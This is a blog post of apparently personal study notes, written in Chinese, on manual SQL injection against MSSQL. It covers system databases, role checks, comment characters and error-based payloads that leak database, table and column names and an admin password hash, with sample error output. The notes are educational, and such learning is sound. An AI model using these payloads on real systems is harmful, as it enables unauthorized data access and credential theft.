<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="sql注入学习--拓展, hybcx&#39;s blog">
    <meta name="description" content="0x01 前言
撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入pay">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-BYTY196ENH');
    </script>


    <title>sql注入学习--拓展 | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span diyFont">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">sql注入学习--拓展</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E5%B8%B8%E8%A7%81top%E6%BC%8F%E6%B4%9E/" class="post-category">
                                常见top漏洞
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-10-15
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2023-12-18
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    8.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    34 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 前言</h1>
<p>撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。</p>
<h1>0x02 Msssql</h1>
<h2 id="2-1-环境搭建">2.1 环境搭建</h2>
<p>哎呀，这一块看着真麻烦，我本是想能实操就实操一下，但这么麻烦感觉还是算了，我初心只是想了解一下语句emmm，那就多用脑子想想吧。</p>
<p>下面都是跟着y4er师傅学习的┭┮﹏┭┮太强啦！！！</p>
<h2 id="2-2-自带库介绍">2.2 自带库介绍</h2>
<pre class="line-numbers language-none"><code class="language-none">master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。

model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础

msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。

tempdb   //它为临时表和其他临时工作提供了一个存储区。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中最主要的是<code>master</code>数据库，其中存储了所有的数据库名等，还有很多<code>存储过程</code></p>
<blockquote>
<p>存储过程是一组为了完成特定功能的SQL 语句集，它存储在数据库中，一次编译后永久有效，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。实际上就是一个封装好的函数，具有面向对象特点。</p>
</blockquote>
<p><img src="image-20231015091759377.png" alt="image-20231015091759377"></p>
<p>在master数据库中有<code>master.dbo.sysdatabases</code>视图，储存所有数据库名,其他数据库的视图则储存他本库的表名与列名。 每一个库的视图表都有<code>syscolumns</code>存储着所有的字段，可编程性储存着我们的函数。</p>
<p>mssql的存储过程天然支持多语句，为我们的注入提供了遍历。</p>
<p>增删改查和MySQL数据库大同小异，具体可以自行w3c。</p>
<h2 id="2-3-信息搜集">2.3 信息搜集</h2>
<p>先来了解下mssql中有哪些角色/权限</p>
<p>以下摘自<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">官网文档</a></p>
<p>这里留着日后有需要在查看，脑子里有个大概印象</p>
<table>
<thead>
<tr>
<th style="text-align:left">服务器级的固定角色</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">sysadmin</td>
<td style="text-align:left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td>
</tr>
<tr>
<td style="text-align:left">serveradmin</td>
<td style="text-align:left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td>
</tr>
<tr>
<td style="text-align:left">securityadmin</td>
<td style="text-align:left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td>
</tr>
<tr>
<td style="text-align:left">processadmin</td>
<td style="text-align:left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td>
</tr>
<tr>
<td style="text-align:left">setupadmin</td>
<td style="text-align:left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td>
</tr>
<tr>
<td style="text-align:left">bulkadmin</td>
<td style="text-align:left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td>
</tr>
<tr>
<td style="text-align:left">diskadmin</td>
<td style="text-align:left">diskadmin 固定服务器角色用于管理磁盘文件。</td>
</tr>
<tr>
<td style="text-align:left">dbcreator</td>
<td style="text-align:left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td>
</tr>
<tr>
<td style="text-align:left">puic</td>
<td style="text-align:left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">固定数据库角色名</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">db_owner</td>
<td style="text-align:left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td>
</tr>
<tr>
<td style="text-align:left">db_securityadmin</td>
<td style="text-align:left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td>
</tr>
<tr>
<td style="text-align:left">db_accessadmin</td>
<td style="text-align:left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td>
</tr>
<tr>
<td style="text-align:left">db_backupoperator</td>
<td style="text-align:left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td>
</tr>
<tr>
<td style="text-align:left">db_ddladmin</td>
<td style="text-align:left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td>
</tr>
<tr>
<td style="text-align:left">db_datawriter</td>
<td style="text-align:left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td>
</tr>
<tr>
<td style="text-align:left">db_datareader</td>
<td style="text-align:left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td>
</tr>
<tr>
<td style="text-align:left">db_denydatawriter</td>
<td style="text-align:left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td>
</tr>
<tr>
<td style="text-align:left">db_denydatareader</td>
<td style="text-align:left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td>
</tr>
</tbody>
</table>
<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
<table>
<thead>
<tr>
<th style="text-align:left">返回值</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">0</td>
<td style="text-align:left">login 不是 role 的成员。</td>
</tr>
<tr>
<td style="text-align:left">1</td>
<td style="text-align:left">login 是 role 的成员。</td>
</tr>
<tr>
<td style="text-align:left">NULL</td>
<td style="text-align:left">role 或 login 无效，或者没有查看角色成员身份的权限。</td>
</tr>
</tbody>
</table>
<p>构造语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'sysadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'serveradmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'setupadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'securityadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'diskadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> is_srvrolemember<span class="token punctuation">(</span><span class="token string">'bulkadmin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>数据库级别的应用角色用<code>IS_MEMBER</code>函数判断</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> IS_MEMBER<span class="token punctuation">(</span><span class="token string">'db_owner'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>再来看一些基本信息</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> @<span class="token variable">@version</span><span class="token punctuation">;</span> <span class="token comment">//版本</span>
<span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">;</span>		<span class="token comment">//用户</span>
<span class="token keyword">SELECT</span> DB_NAME<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span>
<span class="token keyword">SELECT</span> @<span class="token variable">@servername</span><span class="token punctuation">;</span>	<span class="token comment">//主机名</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>那么站库分离可以这么来判断</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">and</span> host_name<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span>@<span class="token variable">@servername</span><span class="token punctuation">;</span><span class="token comment">--'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="2-4-符号">2.4 符号</h2>
<p>注释符</p>
<pre class="line-numbers language-none"><code class="language-none">/* 
--
;%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>空白符号</p>
<pre class="line-numbers language-none"><code class="language-none">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20	--暂时不了解为什么

/**/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>运算</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--基本的不列举了，举几个特殊的</span>
<span class="token keyword">ALL</span> 如果一组的比较都为<span class="token boolean">true</span>，则比较结果为<span class="token boolean">true</span>
<span class="token operator">AND</span> 如果两个布尔表达式都为<span class="token boolean">true</span>，则结果为<span class="token boolean">true</span>；如果其中一个表达式为<span class="token boolean">false</span>，则结果为<span class="token boolean">false</span>
<span class="token keyword">ANY</span> 如果一组的比较中任何一个为<span class="token boolean">true</span>，则结果为<span class="token boolean">true</span>
<span class="token operator">BETWEEN</span> 如果操作数在某个范围之内，那么结果为<span class="token boolean">true</span>
<span class="token keyword">EXISTS</span>  如果子查询中包含了一些行，那么结果为<span class="token boolean">true</span>
<span class="token operator">IN</span>  如果操作数等于表达式列表中的一个，那么结果为<span class="token boolean">true</span>
<span class="token operator">LIKE</span>    如果操作数与某种模式相匹配，那么结果为<span class="token boolean">true</span>
<span class="token operator">NOT</span> 对任何其他布尔运算符的结果值取反
<span class="token operator">OR</span>  如果两个布尔表达式中的任何一个为<span class="token boolean">true</span>，那么结果为<span class="token boolean">true</span>
<span class="token keyword">SOME</span>    如果在一组比较中，有些比较为<span class="token boolean">true</span>，那么结果为<span class="token boolean">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-5-基本注入流程">2.5 基本注入流程</h2>
<p>此处利用mssql数据类型不一样比较报错，爆出当前数据库名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> DB_NAME<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。</p>
<p>爆表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> name <span class="token keyword">from</span> sysobjects <span class="token keyword">WHERE</span> xtype<span class="token operator">=</span><span class="token string">'u'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。</p>
<p>此处<code>xtype</code>可以是下列对象类型中的一种：</p>
<table>
<thead>
<tr>
<th style="text-align:center">缩写</th>
<th style="text-align:left">全称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:left">CHECK 约束</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:left">默认值或 DEFAULT 约束</td>
</tr>
<tr>
<td style="text-align:center">F</td>
<td style="text-align:left">FOREIGN KEY 约束</td>
</tr>
<tr>
<td style="text-align:center">L</td>
<td style="text-align:left">日志</td>
</tr>
<tr>
<td style="text-align:center">FN</td>
<td style="text-align:left">标量函数</td>
</tr>
<tr>
<td style="text-align:center">IF</td>
<td style="text-align:left">内嵌表函数</td>
</tr>
<tr>
<td style="text-align:center">P</td>
<td style="text-align:left">存储过程</td>
</tr>
<tr>
<td style="text-align:center">PK</td>
<td style="text-align:left">PRIMARY KEY 约束（类型是 K）</td>
</tr>
<tr>
<td style="text-align:center">RF</td>
<td style="text-align:left">复制筛选存储过程</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:left">系统表</td>
</tr>
<tr>
<td style="text-align:center">TF</td>
<td style="text-align:left">表函数</td>
</tr>
<tr>
<td style="text-align:center">TR</td>
<td style="text-align:left">触发器</td>
</tr>
<tr>
<td style="text-align:center">U</td>
<td style="text-align:left">用户表</td>
</tr>
<tr>
<td style="text-align:center">UQ</td>
<td style="text-align:left">UNIQUE 约束（类型是 K）</td>
</tr>
<tr>
<td style="text-align:center">V</td>
<td style="text-align:left">视图</td>
</tr>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:left">扩展存储过程</td>
</tr>
</tbody>
</table>
<p>此处的<code>sysobjects</code>等同于<code>[master].[sys].[objects]</code></p>
<p>爆列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> name <span class="token keyword">from</span> syscolumns <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> id <span class="token keyword">from</span> sysobjects <span class="token keyword">where</span> name <span class="token operator">=</span> <span class="token string">'Fanmv_Admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。</p>
<blockquote>
<p>[22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。 (245)</p>
</blockquote>
<p>爆数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">1</span> AdminPass <span class="token keyword">from</span> Fanmv_Admin<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。</p>
<p>当然，在mssql中也存在<code>INFORMATION_SCHEMA</code>，你也可以通过它来查询。</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">TABLES</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> INFORMATION_SCHEMA<span class="token punctuation">.</span><span class="token keyword">COLUMNS</span> <span class="token keyword">where</span> TABLE_NAME<span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">1</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>判断表名更方便的一种方式是使用<code>having 1=1</code>，GROUP BY</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Fanmv_Admin <span class="token keyword">WHERE</span> AdminID<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
